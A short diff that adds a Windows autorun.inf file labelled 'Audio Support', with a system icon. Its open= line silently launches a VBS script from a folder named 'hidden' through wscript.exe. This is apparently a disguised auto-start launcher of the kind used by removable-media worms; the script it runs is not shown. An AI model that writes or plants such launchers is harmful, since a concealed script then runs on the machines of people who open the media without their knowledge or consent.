@@ -1,0 +1,5 @@
+[autorun]
+label=Audio Support
+icon=shell32.dll,34
+open=wscript.exe hidden\AudioHost.vbs
+action=Run Audio Support
